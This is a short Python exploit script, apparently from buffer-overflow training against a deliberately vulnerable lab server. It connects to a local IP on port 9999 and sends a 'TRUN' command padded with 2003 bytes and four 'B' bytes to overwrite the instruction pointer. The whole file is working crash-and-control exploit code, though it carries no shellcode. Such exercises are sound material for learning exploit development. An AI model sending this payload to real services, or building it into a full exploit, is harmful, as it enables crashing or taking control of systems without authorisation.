#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

offset = 2003

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	payload = ""
	payload += "TRUN /.:/"
	payload += "A" * offset # Padding
	payload += "B" * 4 # EIP

	s.send((payload.encode()))
	s.close()

except:
	print("Error connecting to server")
	sys.exit()